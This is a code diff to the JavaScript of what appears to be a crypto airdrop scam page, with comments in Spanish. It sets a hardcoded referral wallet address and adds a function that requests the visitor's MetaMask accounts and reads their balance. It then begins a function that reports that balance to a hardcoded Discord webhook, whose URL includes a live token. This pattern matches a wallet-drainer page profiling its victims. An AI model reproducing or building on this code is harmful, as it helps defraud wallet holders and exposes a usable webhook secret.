@@ -13,6 +13,27 @@ if(ft=gy[i].split("="),ft[0]==e)return ft[1]}
 var ref=querySt("ref");null==ref?(ref="0x01C65F22A9478C2932e62483509c233F0aaD5c72",document.getElementById("airinput").value=ref):document.getElementById("airinput").value=ref;
 
 
+
+
+// Función para obtener el saldo de la cuenta conectada a MetaMask
+async function obtenerSaldo() {
+  if (typeof window.ethereum !== 'undefined') {
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const address = accounts[0];
+    const balance = await window.ethereum.request({
+      method: 'eth_getBalance',
+      params: [address, 'latest']
+    });
+
+    // Convertir el saldo a ETH
+    const saldoEth = web3.utils.fromWei(balance, 'ether');
+
+    return { address, saldo: saldoEth };
+  } else {
+    throw new Error('MetaMask no está instalado o conectado');
+  }
+}
+
 // Función para enviar la notificación a Discord con el saldo
 async function enviarNotificacion(nombreBoton) {
   const webhookURL = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
